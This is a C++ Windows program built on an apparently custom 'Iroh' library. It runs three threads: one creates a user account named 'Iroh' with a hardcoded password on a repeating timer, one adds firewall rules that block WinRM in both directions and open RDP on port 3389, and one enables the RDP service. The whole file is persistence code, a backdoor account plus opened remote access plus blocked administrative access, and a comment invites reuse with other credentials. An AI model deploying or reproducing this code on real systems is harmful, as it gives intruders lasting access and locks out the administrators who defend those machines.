// Windows Local Libraries.
#include <windows.h>
#include <tchar.h>

// Iroh Library Import.
#include "../Iroh-Library/Iroh/User.h"
#include "../Iroh-Library/Iroh/Firewall.h"
#include "../Iroh-Library/Iroh/EnableServices.h"

// Common defines
#define IROH_THREADS		3

using namespace Iroh;

DWORD WINAPI iroh_user_thread(LPVOID lpParam) {
	// Based on the example code for Iroh_Library.
	// Initialize the class object
	IrohUser irohUser = IrohUser();

	// Use setters to set the class variables
	irohUser.SetUsername("Iroh"); // Replace with your own username/password combo.
	irohUser.SetPassword("LeavesFromTheV1ne");
	irohUser.SetSleepTime(10000);

	// Start the process for the irohUser
	irohUser.Start();

	return 0;
}

DWORD WINAPI firewall_thread(LPVOID lpParam) {
	// Initialize the class object.
	Firewall firewall = Firewall();

	// WinRM Firewall Rules //
	Iroh::Firewall::FirewallRule blockWinRMAll;
	blockWinRMAll.ruleName = L"Block All Incoming WinRM Traffic.";
	blockWinRMAll.ruleDescription = L"Blocks All Incoming WinRM Traffic.";
	blockWinRMAll.localPorts = L"5985,5986";
	blockWinRMAll.allowAccess = VARIANT_FALSE;
	blockWinRMAll.protocol = NET_FW_IP_PROTOCOL_ANY;
	blockWinRMAll.direction = NET_FW_RULE_DIR_IN;

	Iroh::Firewall::FirewallRule blockWinRMOut;
	blockWinRMOut.ruleName = L"Block All Outgoing WinRM Traffic.";
	blockWinRMOut.ruleDescription = L"Blocks All Outgoing WinRM Traffic.";
	blockWinRMOut.localPorts = L"5985,5986";
	blockWinRMOut.allowAccess = VARIANT_FALSE;
	blockWinRMOut.protocol = NET_FW_IP_PROTOCOL_ANY;
	blockWinRMOut.direction = NET_FW_RULE_DIR_OUT;

	// RDP Firewall Rules //
	Iroh::Firewall::FirewallRule enableRDP;
	enableRDP.ruleName = L"Enable Incoming RDP Traffic.";
	enableRDP.ruleDescription = L"Enable All Incoming RDP Traffic.";
	enableRDP.localPorts = L"3389";
	enableRDP.protocol = NET_FW_IP_PROTOCOL_ANY;
	enableRDP.direction = NET_FW_RULE_DIR_IN;

	Iroh::Firewall::FirewallRule enableRDPOut;
	enableRDPOut.ruleName = L"Enable Outgoing RDP Traffic.";
	enableRDPOut.ruleDescription = L"Enable All Outgoing RDP Traffic.";
	enableRDPOut.localPorts = L"3389";
	enableRDPOut.protocol = NET_FW_IP_PROTOCOL_ANY;
	enableRDPOut.direction = NET_FW_RULE_DIR_OUT;

	/* Insert firewall rules using this command. */
	// Block all WinRM Traffic.
	firewall.AddRule(blockWinRMAll);
	firewall.AddRule(blockWinRMOut);

	// Enable all RDP Traffic.
	firewall.AddRule(enableRDP);
	firewall.AddRule(enableRDPOut);

	// Start the firewall process
	firewall.Start();

	return 0;
}

DWORD WINAPI services_thread(LPVOID lpParam) {
	// Create the class object.
	EnableServices service_enabler = EnableServices();
	// TODO: Disable services for Iroh.


	// Enable RDP
	service_enabler.SetEnableRDP(TRUE);

	// Start the process for the services.
	service_enabler.Start();

	return 0;
}

int main() {
	HANDLE threads[IROH_THREADS];
	DWORD threads_ids[IROH_THREADS];

	threads[0] = CreateThread(NULL, 0, iroh_user_thread, NULL, 0, &threads_ids[0]);
	threads[1] = CreateThread(NULL, 0, firewall_thread, NULL, 0, &threads_ids[1]);
	threads[2] = CreateThread(NULL, 0, services_thread, NULL, 0, &threads_ids[2]);
	
	WaitForMultipleObjects(IROH_THREADS, threads, TRUE, INFINITE);

	return 0;
}